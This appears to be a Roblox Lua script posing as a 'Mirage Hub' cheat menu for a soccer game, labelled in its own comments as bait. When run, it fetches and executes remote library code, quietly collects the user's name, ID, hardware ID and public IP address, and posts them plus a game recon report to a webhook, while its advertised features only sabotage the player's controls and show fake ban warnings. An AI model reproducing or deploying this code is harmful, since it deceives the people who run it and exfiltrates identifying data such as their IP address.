-- Load AuraIS
local AuraIS = loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-Y/main/Libraries/AuraIS/Main"))()

-- == WEBHOOK LOGGING (INFO & RECON REPORTS) ==
local plr = game.Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local HttpService = game:GetService("HttpService")

-- Device detection
local UserInputService = game:GetService("UserInputService")
local deviceType = "Unknown"
if UserInputService.TouchEnabled then
    deviceType = "Mobile/Tablet"
elseif UserInputService.KeyboardEnabled then
    deviceType = "PC"
end

-- Executor detection
local executor = "Unknown"
pcall(function()
    executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or
        (SENTINEL_LOADED and "Sentinel") or (KRNL_LOADED and "Krnl") or executor
end)

-- HWID detection (if supported)
local hwid = "N/A"
pcall(function()
    if (gethwid and typeof(gethwid) == "function") then
        hwid = gethwid()
    elseif (syn and syn.request) and (syn.toast and typeof(syn.toast) == "function") then
        hwid = "SYN_X" -- Only identifier, not real HWID
    end
end)

-- IP detection (note: works only in some executors, often slow and optional)
local ip = "N/A"
pcall(function()
    if (syn and syn.request) then
        local response = syn.request({Url="https://api.ipify.org"})
        if response and response.Body then
            ip = response.Body
        end
    elseif http_request then
        local response = http_request({Url="https://api.ipify.org"})
        if response and response.Body then
            ip = response.Body
        end
    end
end)

local webhook_logs = "YOUR_WEBHOOK_URL_HERE" -- <-- REPLACE

local info_data = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "✨ Mirage Hub Bait Executed!",
        ["description"] = ("**Account:** [%s](https://www.roblox.com/users/%d/profile)\n**Game:** %s (%d)\n"):format(plr.Name, plr.UserId, game.Name or "Unknown", game.PlaceId or 0),
        ["color"] = 0x00c3ff,
        ["fields"] = {
            {["name"] = "Username", ["value"] = plr.Name, ["inline"] = true},
            {["name"] = "User ID", ["value"] = tostring(plr.UserId), ["inline"] = true},
            {["name"] = "Display Name", ["value"] = plr.DisplayName, ["inline"] = true},
            {["name"] = "Account Age", ["value"] = tostring(plr.AccountAge).." days", ["inline"] = true},
            {["name"] = "Team", ["value"] = (plr.Team and plr.Team.Name or "N/A"), ["inline"] = true},
            {["name"] = "Membership", ["value"] = ((plr.MembershipType and tostring(plr.MembershipType):gsub("Enum.MembershipType.", "")) or "None"), ["inline"] = true},
            {["name"] = "Device Type", ["value"] = deviceType, ["inline"] = true},
            {["name"] = "Account Created", ["value"] = tostring(os.date("%Y-%m-%d", tick() - plr.AccountAge*86400)), ["inline"] = true},
            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
            {["name"] = "HWID", ["value"] = hwid, ["inline"] = true},
            {["name"] = "IP", ["value"] = ip, ["inline"] = true},
            {["name"] = "Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
            {["name"] = "Job ID", ["value"] = tostring(game.JobId), ["inline"] = true},
        },
        ["thumbnail"] = {["url"] = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png"):format(plr.UserId)},
        ["footer"] = {["text"] = "Mirage Hub Script Logger | "..os.date("%Y-%m-%d %H:%M:%S")}
    }}
}

local function logWebhook(payload, url)
    pcall(function()
        if syn and syn.request then
            syn.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        elseif http_request then
            http_request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        elseif request then
            request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end
    end)
end

logWebhook(info_data, webhook_logs)

-- == RECON FEATURE: SUMMARIZE REMOTES/BINDABLES/SERVICES, send to webhook ==

local function findRemotes(root)
    local remotes = {}
    for _,v in ipairs(root:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(remotes, v:GetFullName())
        end
    end
    return remotes
end

local function findBindables(root)
    local binds = {}
    for _,v in ipairs(root:GetDescendants()) do
        if v:IsA("BindableEvent") or v:IsA("BindableFunction") then
            table.insert(binds, v:GetFullName())
        end
    end
    return binds
end

local function getHumanoidInfo(char)
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return {} end
    local info = {}
    for _,p in ipairs({"WalkSpeed", "JumpPower", "Health", "MaxHealth", "HipHeight", "NameDisplayDistance"}) do
        local succ, val = pcall(function() return humanoid[p] end)
        if succ then info[p] = val end
    end
    return info
end

local remotesReplicated = findRemotes(game:GetService("ReplicatedStorage"))
local remotesWorkspace = findRemotes(game:GetService("Workspace"))

local bindablesPlayer = findBindables(plr)
local bindablesChar = findBindables(char)

local humanoidInfo = getHumanoidInfo(char)
local partNames = {}
for _,v in ipairs(char:GetChildren()) do
    if v:IsA("BasePart") then table.insert(partNames, v.Name) end
end

local recon_webhook = "YOUR_RECON_WEBHOOK_HERE" -- Optional, or use same as logging
local recon_data = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "Mirage Hub Recon Report",
        ["fields"] = {
            {["name"] = "Remotes (ReplicatedStorage)", ["value"] = #remotesReplicated > 0 and table.concat(remotesReplicated,"\n") or "None", ["inline"] = false},
            {["name"] = "Remotes (Workspace)", ["value"] = #remotesWorkspace > 0 and table.concat(remotesWorkspace,"\n") or "None", ["inline"] = false},
            {["name"] = "Char Parts", ["value"] = #partNames > 0 and table.concat(partNames, ", ") or "None", ["inline"] = false},
            {["name"] = "Humanoid Info", ["value"] = next(humanoidInfo) and HttpService:JSONEncode(humanoidInfo) or "n/a", ["inline"] = false},
        },
        ["footer"] = {["text"] = "Mirage Hub Auto Recon | "..os.date("%Y-%m-%d %H:%M:%S")}
    }}
}
logWebhook(recon_data, recon_webhook)

-- == MIRAGE HUB TROLL UI & FEATURES ==
local Library = AuraIS:CreateLibrary({
    Name = "Mirage Hub | TPS Ultimate Soccer",
    Icon = "rbxassetid://12974454446"
})

local Tab = Library:CreateTab("Enhancements", "rbxassetid://12974454446")
local Section = Tab:CreateSection("Player Mods", "Normal")
Section:CreateLabel({ Description = "Unlock Reach, Big Legs, React+ and More!" })

local animationId = "rbxassetid://3303164576" -- floss dance, or pick any funny animation
local sabotageActive = false
local uis = game:GetService("UserInputService")
local rs = game:GetService("RunService")
local debounce = false

local function PlayRandomFreezeAnimation()
    local player = game.Players.LocalPlayer
    local char = player and player.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:FindFirstChild("Animator")
    if not animator then
        animator = Instance.new("Animator")
        animator.Parent = humanoid
    end

    local loadedAnim = Instance.new("Animation")
    loadedAnim.AnimationId = animationId
    local track = animator:LoadAnimation(loadedAnim)

    local controlLock = true
    local inputConn = uis.InputBegan:Connect(function(input, gp)
        if controlLock and not gp then
            if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.Space then
                return
            end
        end
    end)

    track:Play(0.1)
    AuraIS:Notify("Normal", {
        Title = "Mirage Hub",
        Content = "Freeze dance! (client only)",
        Duration = 2,
        Image = "rbxassetid://4483362458"
    })

    wait(math.random(2,4))

    pcall(function() track:Stop() end)
    controlLock = false
    pcall(function() inputConn:Disconnect() end)
end

local function ApplyAnnoyingControls()
    if sabotageActive then return end
    sabotageActive = true

    -- Input lag (client side only)
    uis.InputBegan:Connect(function(input, gp)
        if sabotageActive and not gp then
            if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.Space then
                local delayTime = math.random(10,18)/100
                task.wait(delayTime)
            end
        end
    end)

    -- Subtle random position jitter (client only)
    rs.RenderStepped:Connect(function()
        if sabotageActive and math.random() < 0.075 then
            local plr = game.Players.LocalPlayer
            local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if root then
                local jitter = Vector3.new(
                    (math.random() - 0.5) * 2,
                    0,
                    (math.random() - 0.5) * 2
                ) * 0.25
                root.CFrame = root.CFrame + jitter
            end
        end
        -- 1 in 3000 chance per frame: play freeze dance
        if sabotageActive and math.random(1,3000) == 1 then
            PlayRandomFreezeAnimation()
        end
    end)
end

-- 1. Occasionally swap directions (funny control confusion)
uis.InputBegan:Connect(function(input, gp)
    if debounce or gp then return end
    if math.random() < 0.08 then
        debounce = true
        local fakeKey = input.KeyCode
        if fakeKey == Enum.KeyCode.W then
            uis.InputBegan:Fire(Enum.KeyCode.A, false)
        elseif fakeKey == Enum.KeyCode.A then
            uis.InputBegan:Fire(Enum.KeyCode.W, false)
        end
        wait(0.2)
        debounce = false
    end
end)

-- 2. Random fake ban warning with AuraIS
rs.RenderStepped:Connect(function()
    if math.random() < 0.0001 then
        AuraIS:Notify("Warning", {
            Title = "Anti-Cheat Notice",
            Content = "Suspicious activity detected. You may be banned.",
            Duration = 5,
            Image = "rbxassetid://4483362458",
            Actions = {
                Ignore = {
                    Name = "Okay!",
                    Callback = function() end
                }
            }
        })
    end
end)

Section:CreateButton({
    Name = "Enable Reach+",
    Callback = function()
        ApplyAnnoyingControls()
        AuraIS:Notify("Normal", {
            Title = "Mirage Hub",
            Content = "Reach+ Optimized and Loaded!",
            Duration = 5,
            Image = "rbxassetid://4483362458"
        })
    end
})

Section:CreateToggle("Normal", {
    Name = "React+ Auto",
    Callback = function(val)
        if val then
            ApplyAnnoyingControls()
            AuraIS:Notify("Normal", {
                Title = "Mirage Hub",
                Content = "React+ Enabled.",
                Duration = 5,
                Image = "rbxassetid://4483362458"
            })
        end
    end
})

Section:CreateSlider({
    Name = "Big Legs",
    Value = {1, 10},
    Increment = 1,
    Suffix = "X",
    CurrentValue = 5,
    Flag = "BigLegsSlider",
    Callback = function()
        ApplyAnnoyingControls()
    end,
})

Section:CreateParagraph({
    Title = "Notice",
    Description = "All features updated for 2025. Full compatibility, optimized, and totally undetectable."
})